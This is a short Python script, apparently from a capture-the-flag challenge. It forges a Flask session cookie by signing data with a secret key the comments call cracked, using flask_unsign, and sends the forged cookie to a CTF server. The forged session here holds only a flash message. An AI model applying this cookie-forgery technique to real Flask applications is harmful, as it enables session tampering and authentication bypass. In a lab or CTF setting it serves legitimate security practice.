from flask_unsign import sign

# Your secret key (cracked key)
secret_key = 'supersecretkey'

# Session data you want to sign
session_data = {'_flashes': [('error', 'Login failed!')]}

# Sign the session data using flask-unsign
signed_cookie = sign(value=session_data, secret=secret_key)

print("Signed cookie:", signed_cookie)

# Now send the signed cookie with a request
import requests
cookies = {'session': signed_cookie}
url = "http://challenges.ctf.sikt.no:5003"
response = requests.get(url, cookies=cookies)

# Check the response
print("Response Status:", response.status_code)
print("Response Content:", response.text)  # Display the first 500 characters
